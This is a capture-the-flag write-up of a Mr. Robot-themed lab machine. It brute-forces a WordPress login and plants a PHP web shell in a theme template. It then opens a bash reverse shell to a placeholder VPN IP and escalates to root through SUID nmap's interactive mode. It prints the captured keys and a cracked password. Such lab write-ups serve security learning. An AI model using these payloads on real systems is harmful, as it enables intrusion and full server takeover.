### [Reconnaisance]

```
┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster dir --url 10.10.153.211 -w /home/kali/wordlists/common.txt | grep -v '404\|403\|500\|405'

===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.153.211
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/wordlists/common.txt
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2024/04/28 23:30:16 Starting gobuster in directory enumeration mode
===============================================================
/0                    (Status: 301) [Size: 0] [--> http://10.10.153.211/0/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.153.211/Image/]
/admin                (Status: 301) [Size: 235] [--> http://10.10.153.211/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.153.211/feed/atom/]
/audio                (Status: 301) [Size: 235] [--> http://10.10.153.211/audio/]
/blog                 (Status: 301) [Size: 234] [--> http://10.10.153.211/blog/]
/css                  (Status: 301) [Size: 233] [--> http://10.10.153.211/css/]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.153.211/wp-admin/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.153.211/feed/]
/image                (Status: 301) [Size: 0] [--> http://10.10.153.211/image/]
/images               (Status: 301) [Size: 236] [--> http://10.10.153.211/images/]
/index.html           (Status: 200) [Size: 1188]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.153.211/]
/js                   (Status: 301) [Size: 232] [--> http://10.10.153.211/js/]
/intro                (Status: 200) [Size: 516314]
/license              (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> http://10.10.153.211/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://10.10.153.211/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.153.211/feed/rdf/]
/readme               (Status: 200) [Size: 64]
/render/https://www.google.com (Status: 301) [Size: 0] [--> http://10.10.153.211/render/https:/www.google.com]
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.153.211/feed/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.153.211/feed/]
/sitemap              (Status: 200) [Size: 0]
/sitemap.xml          (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 235] [--> http://10.10.153.211/video/]
/wp-admin             (Status: 301) [Size: 238] [--> http://10.10.153.211/wp-admin/]
/wp-config            (Status: 200) [Size: 0]
/wp-content           (Status: 301) [Size: 240] [--> http://10.10.153.211/wp-content/]
/wp-cron              (Status: 200) [Size: 0]
/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.153.211/wp-includes/]
/wp-links-opml        (Status: 200) [Size: 227]
/wp-load              (Status: 200) [Size: 0]
/wp-login             (Status: 200) [Size: 2613]
/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.153.211/wp-login.php?action=register]
Progress: 4684 / 4688 (99.91%)
===============================================================
2024/04/28 23:34:13 Finished
===============================================================
```

⇒ we know that there is a login page and file robots.txt. /wp-admin is denied when we access

### [Exploit]

- In file robots.txt, there are 2 file that we can acess

```
User-agent: *
fsocity.dic // wordlist
key-1-of-3.txt  // the first key
```

- In login page, we know that in Mr.Robot film, there is a name Elliot, so we will try that name first

![Screenshot 2024-04-29 104246](https://github.com/vdh1612/try_hack_me_ctf/assets/125654739/e429a901-b3db-442d-9436-553bd472d831)

                                     ⇒ so this username exists  

- Remmember the wordlist fsocity.dic, i think that it can be the password here. However, it has too many duplicate words so we have to remove all the duplicates

```
┌──(kali㉿kali)-[~/Downloads]
└─$  wc -l fsocity.dic
858160 fsocity.dic
                                                                                                                                                  
┌──(kali㉿kali)-[~/Downloads]
└─$ sort -u fsocity.dic > uniq-fscoity.dic
                                                                                                                                                  
┌──(kali㉿kali)-[~/Downloads]
└─$ wc -l uniq-fscoity.dic 
11451 uniq-fscoity.dic // it has resized to 11k words                                                                                                                                            
```

- Next we have to brute force all the passwords and i use the burpsuite pro in this case bc normal burpsuite will take a lot of time

```
POST /wp-login.php HTTP/1.1
Host: 10.10.153.211
.......
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.153.211/wp-login.php
........
// add variable for value of password
log=Elliot&pwd=§asdasd§&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.153.211%2Fwp-admin%2F&testcookie

```

- Load payloads

![Screenshot 2024-04-29 105139](https://github.com/vdh1612/try_hack_me_ctf/assets/125654739/a3667a1f-001c-49a4-8ad0-b3bfb7b187c6)


- We can notice that there is password `ER28-0652` has different length from others requests
    - The response:
    
    ```
    HTTP/1.1 302 Found
    Date: Mon, 29 Apr 2024 04:01:30 GMT
    Server: Apache
    X-Powered-By: PHP/5.5.29
    Expires: Wed, 11 Jan 1984 05:00:00 GMT
    Cache-Control: no-cache, must-revalidate, max-age=0
    Pragma: no-cache
    X-Frame-Options: SAMEORIGIN
    Set-Cookie: wordpress_test_cookie=WP+Cookie+check; path=/
    Set-Cookie: wordpress_07731d185181ffe85ec9db4c3ed3be08=elliot%7C1714536090%7Ch0LHMKcJ8Yie4iOPSxUlJBsHbL6Pm91BhxHJGsG3UsJ%7C910930774231b3316145a83a12fe7941eef6169c02678ada921b1360617960bc; path=/wp-content/plugins; httponly
    Set-Cookie: wordpress_07731d185181ffe85ec9db4c3ed3be08=elliot%7C1714536090%7Ch0LHMKcJ8Yie4iOPSxUlJBsHbL6Pm91BhxHJGsG3UsJ%7C910930774231b3316145a83a12fe7941eef6169c02678ada921b1360617960bc; path=/wp-admin; httponly
    Set-Cookie: wordpress_logged_in_07731d185181ffe85ec9db4c3ed3be08=elliot%7C1714536090%7Ch0LHMKcJ8Yie4iOPSxUlJBsHbL6Pm91BhxHJGsG3UsJ%7Ce76068009c1ccee99a927c756eb11a6665ccc8fdc9a6ab720b746d71a35898f0; path=/; httponly
    Location: http://10.10.153.211/wp-admin/
    Content-Length: 0
    Connection: close
    Content-Type: text/html; charset=UTF-8
    
    ```
    
    - The length
        
        ![Screenshot 2024-04-29 110441](https://github.com/vdh1612/try_hack_me_ctf/assets/125654739/94c6b9da-d0a2-44a5-a2c1-8f5e84638570)

        
    - Here is admin page after loginning successfully
    
    ![Screenshot 2024-04-29 110844](https://github.com/vdh1612/try_hack_me_ctf/assets/125654739/fafc1fd4-4ce9-474e-a168-1778152c6f79)

    
- In url http://10.10.153.211/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen, we can see that all the source code from file php be displayed here

```
<?php
/**
 * The template for displaying 404 pages (not found)
 *
 * @package WordPress
 * @subpackage Twenty_Fifteen
 * @since Twenty Fifteen 1.0
 */

get_header(); ?>

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

			<section class="error-404 not-found">
				<header class="page-header">
.........

		</main><!-- .site-main -->
	</div><!-- .content-area -->

<?php get_footer(); ?>
```

⇒ we can edit this file (or any file php ) and update to get RCE 

- For testing, i just create a simple payload in Twenty Fifteen: 404 Template (404.php) and click button upload file
    - The payload
        
        ```
        <?php system($_GET['cmd']); ?>
        ```
        
    - The response
        
        ```
        ┌──(kali㉿kali)-[~/Downloads]
        └─$ curl http://10.10.153.211/404.php/?cmd=id
        uid=1(daemon) gid=1(daemon) groups=1(daemon)
                                                       
        ```
        
        ⇒ We rce successfully and we are user daemon
        
    
    [?] However, we must find other 2 keys and we don’t know where are 2 others keys on server. So how can we do that ?
    
    - We have to reverse shell by this payload:
    
    ```
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/OPEN_VPN_IP/8888 0>&1'");?>
    ```
    
    - Netcat on port 8888
    
    ```
    ┌──(kali㉿kali)-[~/Downloads]
    └─$ nc -lvnp 8888
    listening on [any] 8888 ...
    connect to [10.4.65.8] from (UNKNOWN) [10.10.153.211] 49426
    bash: cannot set terminal process group (1754): Inappropriate ioctl for device
    bash: no job control in this shell
    daemon@linux:/opt/bitnami/apps/wordpress/htdocs$  
    ```
    
- Find key2 on the server
    - Find key 2 but permission denied
    
    ```
    daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ find / -name "key-2-of-3.txt" 2>/dev/null                              
    <pps/wordpress/htdocs$ find / -name "key-2-of-3.txt" 2>/dev/null             
    /home/robot/key-2-of-3.txt
    daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ cat /home/robot/key-2-of-3.txt
    <pps/wordpress/htdocs$ cat /home/robot/key-2-of-3.txt                        
    cat: /home/robot/key-2-of-3.txt: Permission denied
    
    ```
    
    - Change dir to /home/robot to check what happens. We can see that the password in md5 maybe it is the password to switch user robot
    
    ```
    daemon@linux:/home/robot$ ls
    ls
    key-2-of-3.txt
    password.raw-md5
    daemon@linux:/home/robot$ cat key-2-of-3.txt
    c
    at key-2-of-3.txt
    cat: key-2-of-3.txt: Permission denied
    daemon@linux:/home/robot$ cat password.raw-md5
    cat password.raw-md5
    robot:c3fcd3d76192e4007dfb496cca67e13b
    
    ```
    
    - Password decrypted: **abcdefghijklmnopqrstuvwxyz**
    - Switch user robot but we working with a reverse shell so the shell session isn't recognized as a terminal.
    
    ```
    daemon@linux:/home$ su robot
    su robot
    su: must be run from a terminal // it must run from terminal
    daemon@linux:/home$ 
    
    ```
    
    [?] How to fix this
    
    - **We have to spawn an Interactive Shell**:
    
    ```
    daemon@linux:/home$ python -c 'import pty; pty.spawn("/bin/bash")'
    python -c 'import pty; pty.spawn("/bin/bash")'
    daemon@linux:/home$ su robot
    su robot
    Password: abcdefghijklmnopqrstuvwxyz
    
    robot@linux:/home$
    ```
    
    - The second key:
    
    ```
    robot@linux:~$ cat key-2-of-3.txt
    cat key-2-of-3.txt
    822c73956184f694993bede3eb39f959
    ```
    

- Find the 3rd key
    - We use find command but it doesn’t show anything. I guest that it is hided in /root
    
    ```
    robot@linux:~$ find / -name 'key-3-of-3.txt' 2>/dev/null
    find / -name 'key-3-of-3.txt' 2>/dev/null
    robot@linux:~$ 
    robot@linux:/$ cd root
    cd root
    **bash: cd: root: Permission denied [*]**
    ```
    
    [?] In this case, is there any way to cd root ?
    
    - We can check if it has **Privilege Escalation**
- **Privilege Escalation**
    - Find all directory have SUID (**SetUID**). For more detail, `SetUID(s): Allows users to execute files with owner permissions.`
    
    ```
    robot@linux:/$ find / -d -perm /4000 2>/dev/null
    find / -d -perm /4000 2>/dev/null
    /bin/ping
    /bin/umount
    /bin/mount
    /bin/ping6
    /bin/su
    /usr/bin/passwd
    /usr/bin/newgrp
    /usr/bin/chsh
    /usr/bin/chfn
    /usr/bin/gpasswd
    /usr/bin/sudo
    /usr/local/bin/nmap
    /usr/lib/openssh/ssh-keysign
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
    /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
    /usr/lib/pt_chown
    
    ```
    
    - Look at the hint on tryhackme, it says nmap
    - After researching, we know that Nmap can be interactive to spawn a shell because it is 3.81 version. However, The interactive mode, only available on versions 2.02 to 5.21, can be used to execute shell commands.
    
    ```
     robot@linux:/$ nmap --version
    nmap --version
    
    nmap version 3.81 ( http://www.insecure.org/nmap/ )
    ```
    
    - Next, i search nmap spawn a shell and it shows  this website https://gtfobins.github.io/gtfobins/nmap/.
    
    ```
    robot@linux:/$ nmap --interactive
    nmap --interactive
    
    Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
    Welcome to Interactive Mode -- press h <enter> for help
    nmap> !sh
    !sh
    # whoami
    whoami
    root
    
    ```
    
    - The final key
    
    ```
    # ls
    ls
    bin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var
    boot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz
    # cd root
    cd root
    # ls
    ls
    firstboot_done  key-3-of-3.txt
    # cat key-3-of-3.txt
    cat key-3-of-3.txt
    04787ddef27c3dee1ee161b21670b4e4
    ```
